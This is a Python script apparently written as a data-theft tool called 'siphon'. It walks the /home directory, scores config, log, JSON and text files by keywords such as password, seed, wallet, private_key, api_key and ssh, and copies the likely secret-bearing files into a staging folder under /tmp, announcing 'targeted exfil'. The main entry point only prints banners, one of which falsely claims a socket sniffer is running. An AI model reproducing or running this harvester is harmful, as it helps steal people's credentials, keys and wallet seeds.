import os
import re
import shutil
import hashlib
import base64
from pathlib import Path

# Keywords for signal detection
SIGNALS = [
    "wallet", "seed", "password", "login", "credential", 
    "private_key", "api_key", "config", "ssh", "auth", "export"
]

EXFIL_DIR = "/tmp/siphon_drop"
TARGET_EXTENSIONS = ['.txt', '.json', '.conf', '.log', '.ini']

def score_file(path):
    """Score file by signal strength based on keywords + entropy."""
    try:
        with open(path, "r", errors='ignore') as f:
            data = f.read()
        score = sum([data.lower().count(k) for k in SIGNALS])
        entropy = len(set(data)) / max(len(data), 1)
        return score * entropy
    except:
        return 0

def siphon_files(root="/home"):
    os.makedirs(EXFIL_DIR, exist_ok=True)
    hits = []
    for dirpath, _, filenames in os.walk(root):
        for name in filenames:
            ext = Path(name).suffix
            full = os.path.join(dirpath, name)
            if ext in TARGET_EXTENSIONS:
                score = score_file(full)
                if score > 2.5:
                    dest = os.path.join(EXFIL_DIR, hashlib.md5(full.encode()).hexdigest())
                    shutil.copy2(full, dest)
                    hits.append((full, score))
    return hits

def run():
    print("[siphon] 🧲 Targeted exfil initiated...")
    results = siphon_files()
    print(f"[siphon] ✅ {len(results)} high-signal files exfiltrated to {EXFIL_DIR}")
    for path, score in sorted(results, key=lambda x: x[1], reverse=True):
        print(f"   ↳ {path} (score: {round(score, 2)})")

def main(args=None):
    print("[+] siphon running.")
    print("[*] Passive socket sniffer active.")

if __name__ == "__main__":
    main()
